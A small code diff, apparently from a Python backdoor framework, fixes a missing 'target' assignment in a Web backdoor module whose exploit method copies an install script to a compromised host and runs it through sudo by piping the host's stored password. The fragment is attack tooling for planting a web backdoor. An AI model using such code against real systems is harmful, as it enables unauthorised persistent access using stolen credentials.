@@ -16,6 +16,7 @@ class Web(Backdoor):
     def do_exploit(self, args):
         port = self.get_value("port")
         name = self.get_value("name")
+        target = self.core.curtarget
         target.scpFiles(self, "web/install.sh", False)
         target.ssh.exec_command("echo " + target.pword + " | sudo -S bash install.sh")
         print("Starting Apache server.")
